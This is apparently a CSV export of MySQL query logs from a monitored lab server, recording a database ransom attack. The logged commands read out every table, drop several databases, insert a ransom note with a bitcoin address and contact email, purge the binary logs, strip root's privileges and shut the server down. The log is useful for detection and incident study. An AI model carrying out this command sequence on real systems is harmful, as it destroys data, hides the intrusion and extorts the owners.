TimeGenerated,DeviceName,ActionType,Query,RawData
"Sep 2, 2026 12:11:33 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:33.818724Z   128 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:11:28 AM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T04:11:27.995348Z   126 Query SET AUTOCOMMIT=0
"Sep 2, 2026 12:06:14 AM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T04:06:14.508632Z   123 Query SELECT @@max_allowed_packet
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:51.297728Z   118 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-02T03:52:51.388657Z   118 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 11:52:51 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.932746Z   117 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.113895Z   115 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T03:52:50.568492Z   116 Query SHOW DATABASES
"Sep 1, 2026 11:52:50 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:50.477500Z   116 Query SET AUTOCOMMIT=0
"Sep 1, 2026 11:52:49 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T03:52:49.717856Z   114 Query SHOW DATABASES
"Sep 1, 2026 11:52:49 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-02T03:52:49.623502Z   114 Query SET AUTOCOMMIT=0
"Sep 1, 2026 10:48:14 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T02:48:14.495205Z   113 Query SELECT @@max_allowed_packet
"Sep 1, 2026 9:34:30 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T01:34:29.869206Z   106 Query SELECT @@max_allowed_packet
"Sep 1, 2026 9:28:21 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T01:28:20.992645Z   101 Query SELECT @@max_allowed_packet
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, SHOW DATABASES LIKE 'mat_server',2026-09-02T00:17:55.019054Z    94 Query SHOW DATABASES LIKE 'mat_server'
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, commit,2026-09-02T00:17:55.249631Z    94 Query commit
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-02T00:17:55.709519Z    94 Query SHOW DATABASES
"Sep 1, 2026 8:17:55 PM",datafiles-corp-s01,Query, commit,2026-09-02T00:17:55.939708Z    94 Query commit
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, SET NAMES utf8mb4,2026-09-02T00:17:54.330151Z    94 Query SET NAMES utf8mb4
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci',2026-09-02T00:17:54.100609Z    94 Query SET NAMES 'utf8mb4' COLLATE 'utf8mb4_general_ci'
"Sep 1, 2026 8:17:54 PM",datafiles-corp-s01,Query, set autocommit=0,2026-09-02T00:17:54.559654Z    94 Query set autocommit=0
"Sep 1, 2026 8:09:18 PM",datafiles-corp-s01,Query, SELECT @@max_allowed_packet,2026-09-02T00:09:18.271454Z    93 Query SELECT @@max_allowed_packet
"Sep 1, 2026 4:28:19 PM",datafiles-corp-s01,Query, SHOW DATABASES,2026-09-01T20:28:18.873943Z    84 Query SHOW DATABASES
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SHUTDOWN,2026-09-01T20:28:17.935292Z    82 Query SHUTDOWN
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:18.779246Z    84 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query," SELECT JSON_SCHEMA_VALID('{""enum"":[0]}', '\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\""')","2026-09-01T20:28:18.403090Z    83 Query SELECT JSON_SCHEMA_VALID('{""enum"":[0]}', '\""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\""')"
"Sep 1, 2026 4:28:18 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:18.308290Z    83 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, GRANT SHUTDOWN ON *.* TO `root`@'%',2026-09-01T20:28:17.383990Z    81 Query GRANT SHUTDOWN ON *.* TO `root`@'%'
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query," REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'","2026-09-01T20:28:16.915501Z    80 Query REVOKE ALL PRIVILEGES, GRANT OPTION FROM `root`@'%'"
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:17.293644Z    81 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:17 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:17.843590Z    82 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:16.238553Z    79 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:16.822570Z    80 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, SHOW MASTER STATUS,2026-09-01T20:28:16.329190Z    79 Query SHOW MASTER STATUS
"Sep 1, 2026 4:28:16 PM",datafiles-corp-s01,Query, PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001',2026-09-01T20:28:16.419597Z    79 Query PURGE BINARY LOGS TO 'josh-mde-lab-bin.000001'
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:15.729619Z    78 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255)),2026-09-01T20:28:14.942893Z    77 Query CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:15.346454Z    77 Query COMMIT
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query," INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')","2026-09-01T20:28:15.160060Z    77 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0109 bitcoin to bc1q0l7hr5v220f5qlqhjhg4p3jjqfkgudazzjnlkw or in 48 hours, your data will be publicly disclosed and deleted. ')"
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1'),2026-09-01T20:28:15.253704Z    77 Query INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit http://spoo.me/mysql) After payment send mail to ak+2fow1@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2FOW1')
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, RESET MASTER,2026-09-01T20:28:15.822907Z    78 Query RESET MASTER
"Sep 1, 2026 4:28:15 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:15.067579Z    77 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, USE RECOVER_YOUR_DATA,2026-09-01T20:28:14.754844Z    77 Query USE RECOVER_YOUR_DATA
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA,2026-09-01T20:28:14.561278Z    77 Query CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:14.096999Z    76 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:14.661714Z    77 Query COMMIT
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, SHOW TABLES,2026-09-01T20:28:14.849333Z    77 Query SHOW TABLES
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:14.468128Z    77 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:14 PM",datafiles-corp-s01,Query, DROP DATABASE `world`,2026-09-01T20:28:13.955839Z    76 Query DROP DATABASE `world`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.191956Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `recover_your_data`,2026-09-01T20:28:13.284134Z    76 Query DROP DATABASE `recover_your_data`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.398574Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `cr_corp_01`,2026-09-01T20:28:13.035604Z    76 Query DROP DATABASE `cr_corp_01`
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, COMMIT,2026-09-01T20:28:13.864284Z    76 Query COMMIT
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:12.943186Z    76 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:13 PM",datafiles-corp-s01,Query, DROP DATABASE `sakila`,2026-09-01T20:28:13.492059Z    76 Query DROP DATABASE `sakila`
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:12.344303Z    75 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:12.253357Z    75 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:12 PM",datafiles-corp-s01,Query, SELECT * FROM `countrylanguage`,2026-09-01T20:28:12.435889Z    75 Query SELECT * FROM `countrylanguage`
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:11.459530Z    74 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:11.553909Z    74 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:11 PM",datafiles-corp-s01,Query, SELECT * FROM `country`,2026-09-01T20:28:11.648554Z    74 Query SELECT * FROM `country`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SHOW tables,2026-09-01T20:28:09.974815Z    72 Query SHOW tables
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:10.427238Z    73 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, USE `world`,2026-09-01T20:28:09.883629Z    72 Query USE `world`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query, SELECT * FROM `city`,2026-09-01T20:28:10.609633Z    73 Query SELECT * FROM `city`
"Sep 1, 2026 4:28:10 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:10.518192Z    73 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world',2026-09-01T20:28:09.789449Z    72 Query SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'world'
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:09.330139Z    71 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:09.698064Z    72 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:09 PM",datafiles-corp-s01,Query, SELECT * FROM `store`,2026-09-01T20:28:08.931239Z    70 Query SELECT * FROM `store`
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:08.062830Z    69 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SELECT * FROM `staff_list`,2026-09-01T20:28:08.251953Z    69 Query SELECT * FROM `staff_list`
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:08.837148Z    70 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:08.743188Z    70 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:08 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:08.158093Z    69 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:07.297792Z    68 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query, SELECT * FROM `staff`,2026-09-01T20:28:07.481396Z    68 Query SELECT * FROM `staff`
"Sep 1, 2026 4:28:07 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:07.389410Z    68 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SELECT * FROM `sales_by_film_category`,2026-09-01T20:28:06.002918Z    66 Query SELECT * FROM `sales_by_film_category`
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:06.560745Z    67 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:06.653919Z    67 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query, SELECT * FROM `sales_by_store`,2026-09-01T20:28:06.747415Z    67 Query SELECT * FROM `sales_by_store`
"Sep 1, 2026 4:28:06 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:05.908329Z    66 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:05 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:05.813837Z    66 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:04.433656Z    65 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query, SELECT * FROM `rental`,2026-09-01T20:28:04.621580Z    65 Query SELECT * FROM `rental`
"Sep 1, 2026 4:28:04 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:04.527402Z    65 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query, SELECT * FROM `payment`,2026-09-01T20:28:03.269682Z    64 Query SELECT * FROM `payment`
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:03.175168Z    64 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:03 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:03.076732Z    64 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:02 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:01.958474Z    63 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:02 PM",datafiles-corp-s01,Query, SELECT * FROM `nicer_but_slower_film_list`,2026-09-01T20:28:02.050593Z    63 Query SELECT * FROM `nicer_but_slower_film_list`
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SELECT * FROM `language`,2026-09-01T20:28:01.309783Z    62 Query SELECT * FROM `language`
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:01.862797Z    63 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:01.217749Z    62 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:28:01 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:01.125857Z    62 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:28:00.181789Z    61 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query, SELECT * FROM `inventory`,2026-09-01T20:28:00.365021Z    61 Query SELECT * FROM `inventory`
"Sep 1, 2026 4:28:00 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:28:00.273337Z    61 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:59.316169Z    60 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:59.223098Z    60 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:59 PM",datafiles-corp-s01,Query, SELECT * FROM `film_text`,2026-09-01T20:27:59.412610Z    60 Query SELECT * FROM `film_text`
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:58.163953Z    59 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:58.070509Z    59 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:58 PM",datafiles-corp-s01,Query, SELECT * FROM `film_list`,2026-09-01T20:27:58.258829Z    59 Query SELECT * FROM `film_list`
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:57.393906Z    58 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:57.302442Z    58 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:57 PM",datafiles-corp-s01,Query, SELECT * FROM `film_category`,2026-09-01T20:27:57.486614Z    58 Query SELECT * FROM `film_category`
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query," SELECT COLUMN_NAME, DATA_TYPE","2026-09-01T20:27:56.426267Z    57 Query SELECT COLUMN_NAME, DATA_TYPE"
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query, SET AUTOCOMMIT=0,2026-09-01T20:27:56.331796Z    57 Query SET AUTOCOMMIT=0
"Sep 1, 2026 4:27:56 PM",datafiles-corp-s01,Query, SELECT * FROM `film_actor`,2026-09-01T20:27:56.521397Z    57 Query SELECT * FROM `film_actor`
